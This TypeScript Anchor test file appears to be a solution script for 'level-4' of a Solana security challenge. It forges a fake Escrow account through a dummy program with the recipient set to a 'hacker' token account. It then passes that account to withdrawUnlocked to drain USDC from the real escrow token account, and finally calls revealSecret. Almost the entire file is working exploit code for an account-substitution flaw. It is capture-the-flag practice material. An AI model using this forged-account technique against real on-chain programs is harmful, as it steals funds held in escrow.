import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import * as spl from "@solana/spl-token"
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")
const ESCROW_RECIPIENT = new web3.PublicKey("H6hsz95AWEzCeHzvnXhs84gDxuiKdmZ6qgKtWqVFZfQJ")
const PROGRAM = new web3.PublicKey("D51vhx6jAbBtQVwo1fcYr7RMKQKAAnSUy6v7vRCHCZL3")
const ESCROW_PDA = new web3.PublicKey("CaCV8Gpkvtk57dbhKqwX9FdTdxS7eAJG7VEStDZ1iTna")



const SECRET = ""


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;

  let escrowPdaAuthority: any;
  let attackEscrow : any;


  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);
    console.log(escrowPdaAuthority)
  });

  it("Inspect escrow and PDA", async () => {  
    const inspectEscrow = await program.account.escrow.fetch(ESCROW);
    console.log(inspectEscrow);
    const inspectPDA =  await program.account.escrow.getAccountInfo(escrowPdaAuthority)
  });

  it('Creates a mock Escrow account', async () => {
    // Load the IDL
    const idl = require('../target/idl/dummy_program.json');
    
    // Generate a new keypair for the program (if needed)
    const dummyProgramKeypair = anchor.web3.Keypair.generate();
    const dummyProgramId = new  web3.PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS")

    // Create a new program instance
    const dummyProgram = new anchor.Program(idl, idl.metadata.address);

    console.log(`Dummy Program ID: ${dummyProgram.programId.toBase58()}`);

    // Create a new account for the dummy program
    const dummyAccount = anchor.web3.Keypair.generate();

    // Initialize the dummy account
    await dummyProgram.rpc.initialize({
      accounts: {
        dummyAccount: dummyAccount.publicKey,
        user: provider.wallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      },
      signers: [dummyAccount],
    });
  
    const mockEscrowKeypair = anchor.web3.Keypair.generate();
    console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`);
  
    const startTime = new anchor.BN(Math.floor(Date.now() / 1000));
    const interval = new anchor.BN(1);
    const endTime = startTime.add(new anchor.BN(10));
  
    const mockEscrow = {
      recipient: HACKER_TOKEN_ACCOUNT,
      mint: USDC,
      amount: new anchor.BN('2001000'),
      withdrawal: new anchor.BN('0'),
      startTime: startTime,
      endTime: endTime,
      interval: interval,
    };
  
    // Custom discriminator
    const discriminator = Buffer.from([213, 161, 76, 199, 38, 28, 209, 80]);
  
    // Serialize the account data
    const accountData = Buffer.alloc(1000); // Allocate more than enough space
    let offset = 0;
  
    // Write discriminator
    discriminator.copy(accountData, offset);
    offset += 8;
  
    // Write other fields (adjust based on your actual account structure)
    accountData.write(mockEscrow.recipient.toBuffer().toString('hex'), offset, 32, 'hex');
    offset += 32;
    accountData.write(mockEscrow.mint.toBuffer().toString('hex'), offset, 32, 'hex');
    offset += 32;
    accountData.writeBigUInt64LE(BigInt(mockEscrow.amount.toString()), offset);
    offset += 8;
    accountData.writeBigUInt64LE(BigInt(mockEscrow.withdrawal.toString()), offset);
    offset += 8;
    accountData.writeBigUInt64LE(BigInt(mockEscrow.startTime.toString()), offset);
    offset += 8;
    accountData.writeBigUInt64LE(BigInt(mockEscrow.endTime.toString()), offset);
    offset += 8;
    accountData.writeBigUInt64LE(BigInt(mockEscrow.interval.toString()), offset);
    offset += 8;
  
    const ESCROW_SIZE = offset;
  
    // Create the account
    const createAccountInstruction = anchor.web3.SystemProgram.createAccount({
      fromPubkey: provider.wallet.publicKey,
      newAccountPubkey: mockEscrowKeypair.publicKey,
      space: ESCROW_SIZE,
      lamports: await provider.connection.getMinimumBalanceForRentExemption(ESCROW_SIZE),
      programId: dummyProgramId,
    });
  
    // Create instruction to write data to the account
    const writeDataInstruction = new anchor.web3.TransactionInstruction({
      keys: [{ pubkey: mockEscrowKeypair.publicKey, isSigner: true, isWritable: true }],
      programId: dummyProgramId,
      data: accountData.slice(0, ESCROW_SIZE),
    });
  
    // Combine instructions in a single transaction
    const transaction = new anchor.web3.Transaction()
      .add(createAccountInstruction)
      .add(writeDataInstruction);
  
    const signature = await provider.sendAndConfirm(transaction, [mockEscrowKeypair]);
    console.log('Mock Escrow account created successfully. Signature:', signature);
  
    await new Promise(resolve => setTimeout(resolve, 2000));

    attackEscrow = mockEscrowKeypair.publicKey;
  });

  it('derives ATA for hacker', async () => {

    const attackEscrowAta = await spl.getOrCreateAssociatedTokenAccount(
      provider.connection,
      hacker,
      USDC,
      hacker.publicKey,
      false,
      'confirmed',
      null,
      spl.TOKEN_2022_PROGRAM_ID,
      spl.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    await new Promise(resolve => setTimeout(resolve, 2000));
    const hackerAtaPubKey = new web3.PublicKey(attackEscrowAta.address)
    console.log(`Hacker ATA -> ${hackerAtaPubKey}`)
  });


  it ("Withdraw", async () => {
    const withdraw = await program.methods.withdrawUnlocked()
    .accounts({
      recipient: hacker.publicKey,
      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
      escrow: attackEscrow,
      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
      escrowPdaAuthority: ESCROW_PDA,
      mint: USDC,
      tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId
    })
    .signers([hacker])
    .rpc()
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(withdraw);

  })
  


  it("Reveals secrets", async () => {

    const airdropSignature = await provider.connection.requestAirdrop(
      hacker.publicKey,
      1000000000 // 1 SOL
    );
    await provider.connection.confirmTransaction(airdropSignature);
    // Create the transaction
    const tx = await program.methods.revealSecret(SECRET)
      .accounts({
        hacker: hacker.publicKey,
        hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
        mint: USDC
      })
      .transaction();
  
    // Sign the transaction
    tx.feePayer = hacker.publicKey;
    tx.recentBlockhash = (await provider.connection.getLatestBlockhash()).blockhash;
    tx.sign(hacker);
  
    // Send the transaction
    const txid = await provider.connection.sendRawTransaction(tx.serialize()); 
    await new Promise(resolve => setTimeout(resolve, 2000)); 
    console.log("Transaction confirmed. Signature:", txid);
  
    // Optional: Fetch the transaction details
    const txDetails = await provider.connection.getTransaction(txid, {
      commitment: 'confirmed',
      maxSupportedTransactionVersion: 0
    });
  
    await new Promise(resolve => setTimeout(resolve, 5000));
    console.log("Transaction details:", txDetails);
  
  });
})


async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
